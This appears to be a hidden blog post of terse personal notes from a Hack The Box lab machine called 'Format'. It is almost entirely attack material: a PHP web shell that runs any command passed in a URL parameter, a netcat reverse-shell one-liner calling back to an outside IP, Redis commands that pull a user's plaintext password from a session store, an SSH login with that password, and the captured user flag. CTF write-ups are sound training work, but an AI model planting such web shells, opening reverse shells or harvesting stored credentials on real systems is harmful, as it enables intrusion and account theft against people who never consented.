---
layout: post
title: htb format
date: 2023-05-18 16:30 +0200
hidden: true
---



in h1 :
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
</form>
<pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
    ?>
</pre>
</body>
</html>
```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f

```bash
$ echo "keys *" | redis-cli -s /var/run/redis/redis.sock
PHPREDIS_SESSION:vj9n5mh0l7euc27s3ijvbvg25f
cooper.dooper
PHPREDIS_SESSION:40vrdgdg9du73cksepuck8dhla
cooper.dooper:sites
random
random:sites
$ hgetall cooper.dooper
sh: 4: hgetall: not found
$ redis-cli -s /var/run/redis/redis.sock
hgetall cooper.dooper
username
cooper.dooper
password
zooperdoopercooper
first-name
Cooper
last-name
Dooper
pro
false
```


username
cooper.dooper
password
zooperdoopercooper


```bash
┌──(rether㉿rether)-[~]
└─$ ssh cooper@microblog.htb 
The authenticity of host 'microblog.htb (10.10.11.213)' can't be established.
ED25519 key fingerprint is SHA256:30cTQN6W3DKQMMwb5RGQA6Ie1hnKQ37/bSbe+vpYE98.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'microblog.htb' (ED25519) to the list of known hosts.
cooper@microblog.htb's password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cooper@format:~$ ls -al
total 24
drwxr-xr-x 2 cooper cooper 4096 Apr 18 23:20 .
drwxr-xr-x 4 root   root   4096 Apr 18 23:20 ..
lrwxrwxrwx 1 cooper cooper    9 Nov  4  2022 .bash_history -> /dev/null
-rw-r--r-- 1 cooper cooper  220 Mar 28  2022 .bash_logout
-rw-r--r-- 1 cooper cooper 3526 Mar 28  2022 .bashrc
-rw-r--r-- 1 cooper cooper  807 Mar 28  2022 .profile
-rw-r----- 1 root   cooper   33 May 18 23:28 user.txt
cooper@format:~$ cat user.txt 
6f0c4fd781c5b1d462c60edc39837a06
```